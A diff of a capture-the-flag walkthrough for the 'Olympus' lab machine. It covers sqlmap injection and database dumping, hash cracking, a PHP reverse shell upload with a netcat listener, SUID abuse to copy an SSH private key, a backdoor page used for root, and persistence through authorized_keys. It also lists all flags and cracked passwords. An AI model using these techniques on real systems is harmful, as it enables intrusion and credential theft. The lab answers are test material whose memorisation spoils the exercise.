@@ -1,6 +1,7 @@
 # Olympus
 
 
+1. Run a port scan with Rustscan.
 ```
 root@ip-10-10-201-175:~# rustscan -r 1-65535 -a 10.10.131.163
 .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
@@ -45,10 +46,12 @@ Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
 ```
 
+2. The webpage on `http://<ip address>:80` doesn't seem to load but we see that it's redirecting us to `olympus.thm`. Add the domain to `/etc/hosts`. Now when we access it we see that the old version of the page is still available somewhere.
 ```
 10.10.131.163   olympus.thm
 ```
 
+3. Look for directories with Gobuster. Look through the directories and we find that `~webmaster` contains the old webpage. Then run Gobuster again on `~webmaster`.
 ```
 root@ip-10-10-201-175:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm
 ===============================================================
@@ -77,16 +80,44 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 2022/07/16 21:07:23 Finished
 ===============================================================
 ```
-
 ```
-https://github.com/BigTiger2020/Victor-CMS-/blob/main/README.md
+root@ip-10-10-255-44:~/Downloads# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://olympus.thm/~webmaster/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/07/16 23:50:44 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/admin (Status: 301)
+/css (Status: 301)
+/fonts (Status: 301)
+/img (Status: 301)
+/includes (Status: 301)
+/index.php (Status: 200)
+/js (Status: 301)
+/LICENSE (Status: 200)
+===============================================================
+2022/07/16 23:50:45 Finished
+===============================================================
+```
+
+4. The website is using `Victor CMS`, and we find that there's a [SQLi vulnerability on the CMS](https://github.com/BigTiger2020/Victor-CMS-/blob/main/README.md). Use Sqlmap to confirm it. Then dump the database with Sqlmap.
+```
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3
-```
-
-```
 sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dump
 ```
 
+5. We find chats, password hashes, and the first flag, `flag{Sm4rt!_k33P_d1gGIng}`.
 ```
 Database: olympus
 Table: chats
@@ -179,37 +210,161 @@ Table: categories
 [*] shutting down at 23:04:57
 ```
 
+6. Try to crack the hashes, we only have any luck on the one for `prometheus`. Try to ssh into the machine as `prometheus`, but the password doesn't grant us access.
 ```
-flag{Sm4rt!_k33P_d1gGIng}
+root@ip-10-10-252-77:~/Downloads# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
+Use the "--format=bcrypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+summertime       (?)
+1g 0:00:01:01 DONE (2022-07-19 19:56) 0.01633g/s 65.55p/s 65.55c/s 65.55C/s 19861986..543210
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
 ```
 
+7. Login as `prometheus` through the login widget on the website. Nothing seems to stand out.
+
+8. We see from the `users` table we dumped that some emails had another subdomain `root@chat.olympus.thm`. Add it to `/etc/hosts`, then navigate to it and login as `prometheus`.
 ```
-root@ip-10-10-255-44:~/Downloads# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://olympus.thm/~webmaster/
+10.10.99.41     chat.olympus.thm
+```
+
+9. Run Gobuster on `http://chat.olympus.thm` and find an `uploads` folder, but it's blank.
+```
+root@ip-10-10-252-77:~/Downloads# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://chat.olympus.thm/
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
-[+] Url:            http://olympus.thm/~webmaster/
+[+] Url:            http://chat.olympus.thm/
 [+] Threads:        10
 [+] Wordlist:       /usr/share/wordlists/dirb/common.txt
 [+] Status codes:   200,204,301,302,307,401,403
 [+] User Agent:     gobuster/3.0.1
 [+] Timeout:        10s
 ===============================================================
-2022/07/16 23:50:44 Starting gobuster
+2022/07/19 20:45:57 Starting gobuster
 ===============================================================
-/.htpasswd (Status: 403)
 /.hta (Status: 403)
+/.htpasswd (Status: 403)
 /.htaccess (Status: 403)
-/admin (Status: 301)
-/css (Status: 301)
-/fonts (Status: 301)
-/img (Status: 301)
-/includes (Status: 301)
-/index.php (Status: 200)
-/js (Status: 301)
-/LICENSE (Status: 200)
+/index.php (Status: 302)
+/javascript (Status: 301)
+/phpmyadmin (Status: 403)
+/server-status (Status: 403)
+/static (Status: 301)
+/uploads (Status: 301)
 ===============================================================
-2022/07/16 23:50:45 Finished
+2022/07/19 20:45:58 Finished
 ===============================================================
 ```
+
+10. We know from the chats table that the names of the files sent are randomized, just like the name of the file `prometheus_password.txt`. If we try to access it at `http://chat.olympus.thm/uploads/47c3210d51761686f3af40a875eeaaea.txt`, we find that we're able to view it. To exploit this, we can download the pentestmonkey php reverse shell, change the ip and port, and then send it as an attachment. Then run the SQli from step 4 again and we should see the randomized file name of the reverse shell we uploaded. Then simple start a netcat listener with `nc -nvlp <port>` and run the reverse shell with `http://chat.olympus.thm/uploads/<randomized file name>`. We should get a shell as `www-data`.
+```
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+| dt         | msg                                                                                                                                                             | file                                 | uname      |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
+| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
+| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+```
+
+11. Navigate to `zeus` home directory and find the second flag `flag{Y0u_G0t_TH3_l1ghtN1nG_P0w3R}`. Another file `zeus.txt` has a message from Prometheus.
+```
+Hey zeus !
+
+
+I managed to hack my way back into the olympus eventually.
+Looks like the IT kid messed up again !
+I've now got a permanent access as a super user to the olympus.
+
+
+
+						- Prometheus.
+```
+
+12. Download Linpeas onto your machine, set up an http server with `python3 -m http.server`, download it onto the victim with `wget`, give the script executable permissions with `chmod +x`, and run it.
+
+13. Out of all the SUID files, only one is created by `zeus` and belongs to the `zeus` group. Because it's a SUID file we can run it as `zeus`. Once we run it we find that we can copy files. Using this, we can copy the `zeus` ssh private key file and view it.
+```
+-rwsr-xr-x 1 zeus zeus 18K Apr 18 09:27 /usr/bin/cputils (Unknown SUID binary)
+```
+```
+www-data@olympus:/tmp$ cputils
+  ____ ____        _   _ _
+ / ___|  _ \ _   _| |_(_) |___
+| |   | |_) | | | | __| | / __|
+| |___|  __/| |_| | |_| | \__ \
+ \____|_|    \__,_|\__|_|_|___/
+
+Enter the Name of Source File: /home/zeus/.ssh/id_rsa
+
+Enter the Name of Target File: id_rsa
+
+File copied successfully.
+```
+
+14. If we try to ssh as `zeus` we find that it's protected with a passphrase. Download `ssh2john.py` and create a hash with `python3 ssh2john.py id_rsa > hash`. Then crack it with `john --wordlist=/usr/share/wordlists/rockyou.txt hash` and find that the passphrase is `snowflake`.
+
+15. Run Linpeas again as zues. We find a few interesting files that are a part of the `zeus` group. Navigate to `/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc` and we find that `VIGQFQFMYOST.php` is a php page that gives us a reverse shell. Navigate to it with `http://<ip address>//0aB44fdS3eDnLkpsz3deGv8TttR4sc/VIGQFQFMYOST.php` and use the password inside the file `a7c5ffcf139742f52a5267c4a0674129` to get a reverse shell as root.
+```
+Group zeus:
+/tmp/linpeas.sh
+/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
+```
+```
+                    ### Congrats !! ###
+
+
+
+
+                            (
+                .            )        )
+                         (  (|              .
+                     )   )\/ ( ( (
+             *  (   ((  /     ))\))  (  )    )
+           (     \   )\(          |  ))( )  (|
+           >)     ))/   |          )/  \((  ) \
+           (     (      .        -.     V )/   )(    (
+            \   /     .   \            .       \))   ))
+              )(      (  | |   )            .    (  /
+             )(    ,'))     \ /          \( `.    )
+             (\>  ,'/__      ))            __`.  /
+            ( \   | /  ___   ( \/     ___   \ | ( (
+             \.)  |/  /   \__      __/   \   \|  ))
+            .  \. |>  \      | __ |      /   <|  /
+                 )/    \____/ :..: \____/     \ <
+          )   \ (|__  .      / ;: \          __| )  (
+         ((    )\)  ~--_     --  --      _--~    /  ))
+          \    (    |  ||               ||  |   (  /
+                \.  |  ||_             _||  |  /
+                  > :  |  ~V+-I_I_I-+V~  |  : (.
+                 (  \:  T\   _     _   /T  : ./
+                  \  :    T^T T-+-T T^T    ;<
+                   \..`_       -+-       _'  )
+                      . `--=.._____..=--'. ./
+
+
+
+
+                You did it, you defeated the gods.
+                        Hope you had fun !
+
+
+
+                   flag{D4mN!_Y0u_G0T_m3_:)_}
+
+
+
+
+PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)
+
+                  (Hint : regex can be usefull)
+```
+
+16. Generate ssh keys on your machine, paste your public key in the `authorized_keys` file of the victim, and then login as root. Search all files for `flag{` and find that the last flag is `flag{y0u_G0t_m3_g00d!}`.
